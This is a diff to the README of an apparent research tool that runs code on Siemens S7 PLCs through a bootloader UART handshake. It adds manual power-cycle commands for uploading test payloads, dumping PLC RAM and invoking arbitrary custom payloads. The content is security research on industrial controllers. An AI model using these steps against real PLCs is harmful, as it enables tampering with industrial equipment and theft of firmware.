@@ -167,15 +167,35 @@ Once we are done compiling the payloads for Cortex-R4 CPU, we can open the chann
 research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh start.sh
 ```
 
+### Using the `--no-power-supply` Option
+
+For scenarios where an external power switching device (like the ALLNET ALL3075V3) is unavailable or undesired, the `--no-power-supply` flag provides an alternative. When this flag is used:
+
+*   The client script bypasses all power-switching logic.
+*   It will attempt to establish a connection with the PLC by repeatedly sending the magic handshake (`MFGT1`) for up to 60 seconds.
+*   **You must manually power cycle the PLC** (i.e., turn it off and then on again) shortly before or during this 60-second window to allow the bootloader to receive the handshake.
+*   This option should be used *instead of* `--switch-power` and any related `--powersupply-*` arguments. If `--switch-power` is also present, the power cycling logic will still be skipped if `--no-power-supply` is specified.
+
+This method is useful if you can manually control the PLC's power state and want to use the tool without the automated power-cycling hardware.
+
 ### DEMO 1: Upload and executing stager and test payloads 
 
 Now, we can use our client utility. Open a new console window (without closing the console which runs `start.sh`), and type the following command for uploading the stager and test payload to the UART: 
 
+**With automated power switching:**
 ```console
-research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-delay=1 test
+# Ensure client.sh is configured with your power supply details
+sh client.sh --switch-power --powersupply-delay=1 test
 ```
 
-The `--powersupply-delay` is provided for Cold-boot style firmware dumping (we do not use it at this stage but providing this item is required). The argument `test` uses the payload in `payloads/hello_world/hello_world.bin` file. This payload literraly just run inside the PLC and send string `TEST` back to the client, thus client knows the code successfully executed inside the PLC.  
+**With manual power cycle using `--no-power-supply`:**
+```console
+# Replace <PORT> with the TCP port socat is listening on (e.g., 20000 if using default start.sh)
+# You will need to manually power cycle the PLC for the handshake to succeed within 60 seconds.
+python3 client.py --port <PORT> --no-power-supply test --payload payloads/hello_world/build/hello_world.bin
+```
+
+The `--powersupply-delay` (in the automated example) is provided for Cold-boot style firmware dumping. The argument `test` uses the payload in `payloads/hello_world/build/hello_world.bin` file. This payload literally just runs inside the PLC and sends string `TEST` back to the client, thus client knows the code successfully executed inside the PLC.
 
 
 
@@ -206,15 +226,22 @@ Now we must use the tictactoe mode of our script utility as it allows us to inte
 
 
 ```console
-research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-delay=1 tictactoe --payload=payloads/tictactoe/build/tictactoe.bin
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-delay=1 tictactoe --payload=payloads/tic_tac_toe/build/tic_tac_toe.bin
 ```
 
-Note that the tictactoe mode, allow us to use alternative payloads using `--payload` argument. So we are not bounded to only use the tictactoe.bin payload. 
+**With manual power cycle using `--no-power-supply`:**
+```console
+# Replace <PORT> with the TCP port socat is listening on.
+# Manually power cycle the PLC.
+python3 client.py --port <PORT> --no-power-supply tictactoe --payload payloads/tic_tac_toe/build/tic_tac_toe.bin
+```
+
+Note that the tictactoe mode, allow us to use alternative payloads using `--payload` argument. So we are not bounded to only use the `tic_tac_toe.bin` payload.
 
 
 ### DEMO 3: Running the Greetings From PLC in an infinite loop
 
-We have alternate version of `hello_world` which the PLC instead of sending a single string `TEST` back to the client utility, it will send string `Gretings from PLC` in an infinite loop to the client utility.  This payload is located inside `uart_rce/payloads/hello_loop/`. Since this payload is written in C, you need to compile it using make command: 
+We have alternate version of `hello_world` which the PLC instead of sending a single string `TEST` back to the client utility, it will send string `Gretings from PLC` in an infinite loop to the client utility. This payload is located inside `uart_rce/payloads/hello_loop/`. Since this payload is written in C, you need to compile it using make command:
 
 
 ```console
@@ -234,14 +261,20 @@ This will generate `hello_loop.bin` file, which will be used by our client utili
 
 
 ```console
-research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-delay=1 tictactoe --payload=payloads/hello_loop/build/hello_loop.bin
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-delay=1 hello_loop --payload=payloads/hello_loop/build/hello_loop.bin
 ```
 
+**With manual power cycle using `--no-power-supply`:**
+```console
+# Replace <PORT> with the TCP port socat is listening on.
+# Manually power cycle the PLC.
+python3 client.py --port <PORT> --no-power-supply hello_loop --payload payloads/hello_loop/build/hello_loop.bin
+```
 
 
 ### DEMO 4: Dumping S7 PLC RAM
 
-To dump the PLC memory, we would recommend to first turn on the PLC for few seconds, to let the PLC copy contents of the NAND flash to the RAM (alternatively you can wait as long as you want!). We specially designed `--powersupply-delay` argument in our utility for this purpose. We use dump mode in our utility followed by `-a` argument which user supplies address to dump and `-l` argument for the byte size. 
+To dump the PLC memory, we would recommend to first turn on the PLC for few seconds, to let the PLC copy contents of the NAND flash to the RAM (alternatively you can wait as long as you want!). We specially designed `--powersupply-delay` argument in our utility for this purpose. We use dump mode in our utility followed by `-a` argument which user supplies address to dump and `-l` argument for the byte size.
 
 Similar to other demos we need to first compile our payload:
 
@@ -263,10 +296,37 @@ Now we are ready to dump the PLC. Here we put power supply delay argument to 30 
 
 
 ```console
-research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client_bricked.sh --switch-power --powersupply-delay=30 dump -a 0x691E28 -l 256
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-delay=30 dump -a 0x691E28 -l 256 --dump-payload payloads/dump_mem/build/dump_mem.bin
 ```
 
-In this example, we dump 256 bytes starting from offset `0x691E28` of the PLC memory. Once utility dump the memory, it place it in `uart_rce/` folder with the prefix `mem_dump_` plus start and end range address (mem_dump_00691e28_00691f28). 
+**With manual power cycle using `--no-power-supply`:**
+```console
+# Replace <PORT> with the TCP port socat is listening on.
+# Manually power cycle the PLC.
+python3 client.py --port <PORT> --no-power-supply dump -a 0x691E28 -l 256 --dump-payload payloads/dump_mem/build/dump_mem.bin
+```
+
+In this example, we dump 256 bytes starting from offset `0x691E28` of the PLC memory. Once utility dump the memory, it place it in `uart_rce/` folder with the prefix `mem_dump_` plus start and end range address (e.g., `mem_dump_00691e28_00691f28`).
+
+### DEMO 5: Generic Payload Invocation with Custom Arguments
+
+This demonstrates using the generic `invoke` action to run a custom payload with specific arguments.
+
+**With automated power switching:**
+```console
+# Ensure client.sh is configured. Replace <PORT>, path/to/custom.bin, arg1, arg2 accordingly.
+# This example assumes client.sh can pass through arguments to client.py's invoke action.
+# You might need to adapt client.sh or call client.py directly if client.sh doesn't support this well.
+sh client.sh --switch-power --powersupply-delay=1 invoke --payload path/to/your/custom_payload.bin -a arg1 arg2
+```
+
+**With manual power cycle using `--no-power-supply`:**
+```console
+# Replace <PORT> with the TCP port socat is listening on.
+# Manually power cycle the PLC.
+python3 client.py --port <PORT> --no-power-supply invoke --payload path/to/your/custom_payload.bin -a arg1 arg2
+```
+Ensure `path/to/your/custom_payload.bin` points to your compiled payload and `arg1 arg2` are the arguments your payload expects.
 
 
 
@@ -290,9 +350,9 @@ Our utility currently only supports S7 bootloader version `4.2.1`. The client ut
 
 
 
-## Public Talks: 
+## Public Talks:
 
-We presented our research at multiple venues. Here is the list of them: 
+We presented our research at multiple venues. Here is the list of them:
 
  * Special Access Features on PLC’s, Ali Abbasi, Tobias Scharnowski, SCADA Security Scientific Symposium (S4), Jan 2020, Miami, USA.
 
